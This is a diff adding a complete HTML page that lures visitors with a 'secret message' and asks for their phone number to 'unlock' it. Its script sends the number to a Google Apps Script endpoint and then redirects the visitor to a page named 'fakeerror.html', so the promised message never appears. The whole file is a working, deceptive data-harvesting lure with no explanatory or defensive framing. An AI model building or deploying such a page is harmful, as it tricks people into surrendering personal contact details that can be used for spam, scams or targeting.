@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secret Message</title>
+  <style>
+    body {
+      background-color: #fcefee;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    input[type="tel"] {
+      padding: 12px;
+      width: 80%;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #ff4d6d;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Hey! I have a message for you 💌</h2>
+    <p>Make an account to unlock it.</p>
+    <input type="tel" id="phone" placeholder="Enter your phone number" maxlength="10" />
+    <br>
+    <button onclick="submitNumber()">Submit</button>
+  </div>
+
+  <script>
+    function submitNumber() {
+      const phone = document.getElementById("phone").value;
+      if (phone.length === 10) {
+        fetch("https://script.google.com/macros/s/AKfycbycGyHuNlquzWpDO56DYGmu-GLtiljn6q3u2GPrlCqDWOJFoY1DSU2ahfUoQdhrcAa6_w/exec", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+          },
+          body: "phone=" + encodeURIComponent(phone),
+        })
+        .then(() => {
+          window.location.href = "https://willowy-otter-80026c.netlify.app/fakeerror.html";
+        });
+      } else {
+        alert("Please enter a valid 10-digit phone number.");
+      }
+    }
+  </script>
+</body>
+</html>
